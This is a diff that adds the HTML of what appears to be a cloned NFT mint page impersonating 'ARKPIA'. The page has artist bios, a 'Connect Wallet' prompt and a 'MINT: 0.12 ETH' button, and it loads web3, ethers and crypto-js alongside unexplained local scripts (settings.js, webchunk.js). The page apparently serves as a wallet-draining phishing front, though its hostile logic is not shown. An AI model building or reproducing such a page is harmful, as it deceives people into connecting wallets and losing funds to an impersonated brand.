@@ -1,0 +1,251 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <script src="https://unpkg.com/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="https://unpkg.com/crypto-js@latest/crypto-js.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript">
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="./js/settings.js">
+  </script>
+  <script src="./js/webchunk.js">
+  </script>
+  <meta content="width=device-width" name="viewport"/>
+  <meta content="Arkpia" name="description"/>
+  <meta content="Arkpia" property="og:title"/>
+  <meta content="website" property="og:type"/>
+  <meta content="https://mintarkpia.io/" property="og:url"/>
+  <meta content="/android-chrome-192x192.png" property="og:image"/>
+  <meta content="Arkpia" property="og:description"/>
+  <link href="/favicon.ico" rel="icon"/>
+  <meta content="9" name="next-head-count"/>
+  <link as="style" href="/_next/static/css/51035177ddf22cc2.css" rel="preload"/>
+  <link data-n-g="" href="/_next/static/css/51035177ddf22cc2.css" rel="stylesheet"/>
+  <noscript data-n-css="">
+  </noscript>
+  <script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/webpack-fddc814a124b074a.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/framework-73b8966a3c579ab0.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/main-b57260f95efdbaad.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/pages/_app-ccee5645551ceacc.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/1bfc9850-f74c635c534b6623.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/72-4c7d074a38256d9c.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/580-c45076418399f2ed.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/pages/index-d75723f7a330238e.js">
+  </script>
+  <script defer="" src="/_next/static/cRkHvaVYu2hxS3uCQIQ6M/_buildManifest.js">
+  </script>
+  <script defer="" src="/_next/static/cRkHvaVYu2hxS3uCQIQ6M/_ssgManifest.js">
+  </script>
+  <style data-emotion="css" data-s="">
+  </style>
+  <title>
+   Arkpia
+  </title>
+ </head>
+ <link href="totalcss.css" rel="stylesheet"/>
+ <body>
+  <div id="__next">
+   <div>
+    <div data-rk="">
+     <style>
+      [data-rk]{--rk-blurs-modalOverlay:blur(0px);--rk-fonts-body:SFRounded, ui-rounded, "SF Pro Rounded", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";--rk-radii-actionButton:9999px;--rk-radii-connectButton:12px;--rk-radii-menuButton:12px;--rk-radii-modal:24px;--rk-radii-modalMobile:28px;--rk-colors-accentColor:#0E76FD;--rk-colors-accentColorForeground:#FFF;--rk-colors-actionButtonBorder:rgba(0, 0, 0, 0.04);--rk-colors-actionButtonBorderMobile:rgba(0, 0, 0, 0.06);--rk-colors-actionButtonSecondaryBackground:rgba(0, 0, 0, 0.06);--rk-colors-closeButton:rgba(60, 66, 66, 0.8);--rk-colors-closeButtonBackground:rgba(0, 0, 0, 0.06);--rk-colors-connectButtonBackground:#FFF;--rk-colors-connectButtonBackgroundError:#FF494A;--rk-colors-connectButtonInnerBackground:linear-gradient(0deg, rgba(0, 0, 0, 0.03), rgba(0, 0, 0, 0.06));--rk-colors-connectButtonText:#25292E;--rk-colors-connectButtonTextError:#FFF;--rk-colors-connectionIndicator:#30E000;--rk-colors-downloadBottomCardBackground:linear-gradient(126deg, rgba(255, 255, 255, 0) 9.49%, rgba(171, 171, 171, 0.04) 71.04%), #FFFFFF;--rk-colors-downloadTopCardBackground:linear-gradient(126deg, rgba(171, 171, 171, 0.2) 9.49%, rgba(255, 255, 255, 0) 71.04%), #FFFFFF;--rk-colors-error:#FF494A;--rk-colors-generalBorder:rgba(0, 0, 0, 0.06);--rk-colors-generalBorderDim:rgba(0, 0, 0, 0.03);--rk-colors-menuItemBackground:rgba(60, 66, 66, 0.1);--rk-colors-modalBackdrop:rgba(0, 0, 0, 0.3);--rk-colors-modalBackground:#FFF;--rk-colors-modalBorder:transparent;--rk-colors-modalText:#25292E;--rk-colors-modalTextDim:rgba(60, 66, 66, 0.3);--rk-colors-modalTextSecondary:rgba(60, 66, 66, 0.6);--rk-colors-profileAction:#FFF;--rk-colors-profileActionHover:rgba(255, 255, 255, 0.5);--rk-colors-profileForeground:rgba(60, 66, 66, 0.06);--rk-colors-selectedOptionBorder:rgba(60, 66, 66, 0.1);--rk-colors-standby:#FFD641;--rk-shadows-connectButton:0px 4px 12px rgba(0, 0, 0, 0.1);--rk-shadows-dialog:0px 8px 32px rgba(0, 0, 0, 0.32);--rk-shadows-profileDetailsAction:0px 2px 6px rgba(37, 41, 46, 0.04);--rk-shadows-selectedOption:0px 2px 6px rgba(0, 0, 0, 0.24);--rk-shadows-selectedWallet:0px 2px 6px rgba(0, 0, 0, 0.12);--rk-shadows-walletLogo:0px 2px 16px rgba(0, 0, 0, 0.16);}
+     </style>
+     <div class="mx-auto bg-[#303030] md:w-full" style="top: 20px;">
+      <div class="mx-auto max-w-[1400px] container mx-auto flex items-center justify-between py-4">
+       <div class="grid-cols-2 lg:grid-cols-1">
+        <img alt="logo" height="50px" src="/assets/logo_and_text.svg" width="100px"/>
+       </div>
+       <div class="flex items-center justify-center gap-x-3">
+        <p class="hidden text-sm text-[#DD3700] lg:block">
+         Connect Wallet
+        </p>
+        <img class="w-5 cursor-pointer" src="/assets/connect_icon.svg"/>
+       </div>
+      </div>
+     </div>
+     <div class="flex w-full items-center justify-center bg-[#DD3700] py-2 text-xs text-white">
+      <div class="flex flex-col text-center sm:flex-row">
+       <p>
+        NFT Artworks are published by
+       </p>
+       <p class="cursor-pointer font-bold underline sm:mx-1">
+        ARKPIA.
+       </p>
+       <p>
+        Beware of similar products.
+       </p>
+      </div>
+     </div>
+     <div class="mx-auto max-w-[1400px] mb-14 mt-12 flex flex-col items-center justify-center font-bold sm:mt-16">
+      <div class="flex flex-col items-center justify-center">
+       <h2 class="text-2xl uppercase text-[#DD4155]">
+        arkpia nft artworks
+       </h2>
+       <p class="mt-1 text-4xl font-bold uppercase text-black">
+        mint site
+       </p>
+       <p class="mt-4 text-sm font-normal text-ark-gray">
+        ARKPIA NFT Artworks can be only minted from this site.
+       </p>
+      </div>
+      <div class="mt-14 flex flex-col gap-y-4">
+       <div class="relative mx-auto grid h-[200px] w-[95%] rounded-2xl border border-gray-100 shadow-lg sm:py-0 lg:aspect-[920/300] lg:h-[330px] lg:w-full lg:grid-cols-10">
+        <div class="css-1pphovf">
+         <p class="mt-2">
+          New Mint
+         </p>
+        </div>
+        <div class="relative col-span-10 rounded-2xl lg:col-span-6" style='background-image: url("assets/rec.png"); background-size: cover; background-position: center center; background-repeat: no-repeat; height: 100%; width: 100%;'>
+         <div class="absolute bottom-8 left-8">
+          <p class="text-sm text-white hidden">
+           ARKPIA Pass
+          </p>
+          <p class="mt-4 max-w-[400px] text-xs font-normal text-white">
+          </p>
+         </div>
+        </div>
+        <div class="col-span-10 mx-auto mt-10 flex max-w-[70%] flex-col justify-center lg:col-span-4">
+         <p class="mb-1 text-lg font-bold uppercase text-black">
+          ARKPIA Pass
+         </p>
+         <p class="text-sm font-normal text-ark-gray">
+          ARKPIA Pass unlocks the gateway to an enchanting journey.
+    Experience the world of Web3 art with ARKPIA's exceptional artists.
+         </p>
+         <div class="flex grow flex-col justify-end pb-8 text-sm font-normal text-ark-gray">
+          <p>
+           Collectible: 450
+          </p>
+          <div class="mt-3 flex w-full select-none flex-row items-center justify-center gap-x-2 css-0">
+           <div class="flex h-[40px] w-[85px] flex-row items-center justify-center gap-x-2 rounded-full" style="border: 3px solid rgb(221, 55, 0);">
+            <svg class="cursor-pointer" color="#DD3700" fill="currentColor" height="10" stroke="currentColor" stroke-width="0" style="color: rgb(221, 55, 0);" viewbox="0 0 448 512" width="10" xmlns="http://www.w3.org/2000/svg">
+             <path d="M416 208H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h384c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z">
+             </path>
+            </svg>
+            <p class="mx-1 text-lg font-bold" style="color: rgb(221, 55, 0);">
+             1
+            </p>
+            <svg class="cursor-pointer" color="#DD3700" fill="currentColor" height="10" stroke="currentColor" stroke-width="0" style="color: rgb(221, 55, 0);" viewbox="0 0 448 512" width="10" xmlns="http://www.w3.org/2000/svg">
+             <path d="M416 208H272V64c0-17.67-14.33-32-32-32h-32c-17.67 0-32 14.33-32 32v144H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h144v144c0 17.67 14.33 32 32 32h32c17.67 0 32-14.33 32-32V304h144c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z">
+             </path>
+            </svg>
+           </div>
+           <div class="grow">
+            <button class="h-[40px] w-full rounded-full font-bold text-white connectButton" style="background-color: rgb(221, 55, 0);">
+             MINT: 0.12 ETH
+            </button>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="h mx-auto flex w-[95%] flex-col items-center justify-center rounded-2xl border border-gray-100 py-8 font-normal shadow-md sm:aspect-[920/300] sm:h-[330px] sm:w-full sm:py-0 lg:py-0">
+        <img class="mb-3 h-8 w-8" src="/assets/mini_logo.svg"/>
+        <h6 class="mt-4 text-xs text-[#DD3700] sm:mt-0">
+         ARKPIA Artist: Coming Soon
+        </h6>
+        <p class="text-3xl text-[#434343]">
+         Gabriel Hollington
+        </p>
+        <p class="mt-4 max-w-[95%] text-center text-sm text-ark-gray sm:max-w-[600px]">
+         Gabriel is an illustrator from the U.K. who has created his own art world through a bold and simple style that was influenced by skate boards, graffiti and cartoons, among other things. He has showcased many works through his collaboration with such brands as VANS and Nickelodeon.
+        </p>
+       </div>
+       <div class="h mx-auto flex w-[95%] flex-col items-center justify-center rounded-2xl border border-gray-100 py-8 font-normal shadow-md sm:aspect-[920/300] sm:h-[330px] sm:w-full sm:py-0 lg:py-0">
+        <img class="mb-3 h-8 w-8" src="/assets/mini_logo.svg"/>
+        <h6 class="mt-4 text-xs text-[#DD3700] sm:mt-0">
+         ARKPIA Artist: Coming Soon
+        </h6>
+        <p class="text-3xl text-[#434343]">
+         Sarah Beetson
+        </p>
+        <p class="mt-4 max-w-[95%] text-center text-sm text-ark-gray sm:max-w-[600px]">
+         Sarah is an Illustrator/Fine artist from the U.K./Australia whose art covers a wide spectrum of topics including fashion, the environment, gender, culture and politics. Selected as one of the top emerging artists by Saatchi Art, Sarah has collaborated with such brands as IKEA, Ford, Adidas, MAC and Delta Airlines.
+        </p>
+       </div>
+       <div class="h mx-auto flex w-[95%] flex-col items-center justify-center rounded-2xl border border-gray-100 py-8 font-normal shadow-md sm:aspect-[920/300] sm:h-[330px] sm:w-full sm:py-0 lg:py-0">
+        <img class="mb-3 h-8 w-8" src="/assets/mini_logo.svg"/>
+        <h6 class="mt-4 text-xs text-[#DD3700] sm:mt-0">
+         ARKPIA Artist: Coming Soon
+        </h6>
+        <p class="text-3xl text-[#434343]">
+         Florentijn Hofman
+        </p>
+        <p class="mt-4 max-w-[95%] text-center text-sm text-ark-gray sm:max-w-[600px]">
+         Florentijn is a sculpture essayist from the Netherlands who showcases what can be interpreted as 3D essays in display form. He performs all over the world, surprising audiences by displaying fable-like characters in exaggerated sizes in unexpected locations.
+        </p>
+       </div>
+       <div class="h mx-auto flex w-[95%] flex-col items-center justify-center rounded-2xl border border-gray-100 py-8 font-normal shadow-md sm:aspect-[920/300] sm:h-[330px] sm:w-full sm:py-0 lg:py-0">
+        <img class="mb-3 h-8 w-8" src="/assets/mini_logo.svg"/>
+        <h6 class="mt-4 text-xs text-[#DD3700] sm:mt-0">
+         ARKPIA Artist: Coming Soon
+        </h6>
+        <p class="text-3xl text-[#434343]">
+         Ben Ouaniche
+        </p>
+        <p class="mt-4 max-w-[95%] text-center text-sm text-ark-gray sm:max-w-[600px]">
+         Ben is a visual artist from Israel who specializes in capturing moments by incorporating studio shoots, visual engineering and post production methods. Ben has collaborated with top companies such as Google, Hennessey and McDonalds and is currently researching new artistic realms.
+        </p>
+       </div>
+       <div class="h mx-auto flex w-[95%] flex-col items-center justify-center rounded-2xl border border-gray-100 py-8 font-normal shadow-md sm:aspect-[920/300] sm:h-[330px] sm:w-full sm:py-0 lg:py-0">
+        <img class="mb-3 h-8 w-8" src="/assets/mini_logo.svg"/>
+        <h6 class="mt-4 text-xs text-[#DD3700] sm:mt-0">
+         ARKPIA Artist: Coming Soon
+        </h6>
+        <p class="text-3xl text-[#434343]">
+         Dan Woodger
+        </p>
+        <p class="mt-4 max-w-[95%] text-center text-sm text-ark-gray sm:max-w-[600px]">
+         An illustrator who spread his name with LINE emoticons"
+  Dan Woodger is a British illustrator and animator who has collaborated with leading brands such as Apple, Pepsi, Samsung, Line, and Netflix. In particular, he has gained a high level of recognition throughout Asia for his line messenger emoticon creation. His colorful and fun character-based works are characterized by brightening your day and making you smile.
+        </p>
+       </div>
+      </div>
+     </div>
+     <div aria-label="Notifications (F8)" role="region" style="pointer-events: none;" tabindex="-1">
+      <ol class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]" tabindex="-1">
+      </ol>
+     </div>
+     <div class="mt-2 w-screen border bg-white py-4">
+      <div class="mx-auto max-w-[1400px]">
+       <div class="grid items-center justify-center gap-x-24 gap-y-10 lg:grid-cols-3">
+        <div class="col-span-1 mx-auto">
+         <img class="w-42 cursor-pointer" src="assets/footer_logo.svg"/>
+        </div>
+        <div class="mx-auto flex flex-row gap-x-7">
+         <img class="w-5 cursor-pointer" src="/assets/twitter.svg"/>
+         <img class="w-5 cursor-pointer" src="/assets/instagram.svg"/>
+         <img class="w-5 cursor-pointer" src="/assets/discord.svg"/>
+        </div>
+        <div class="mx-auto">
+         <p class="cursor-pointer text-sm text-ark-gray">
+          Terms Of use
+         </p>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+  <script id="__NEXT_DATA__" type="application/json">
+   {"props":{"pageProps":{"mintPrice":"0.12"},"__N_SSG":true},"page":"/","query":{},"buildId":"cRkHvaVYu2hxS3uCQIQ6M","isFallback":false,"gsp":true,"locale":"en","locales":["en"],"defaultLocale":"en","scriptLoader":[]}
+  </script>
+  <next-route-announcer>
+   <p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;">
+   </p>
+  </next-route-announcer>
+ </body>
+</html>
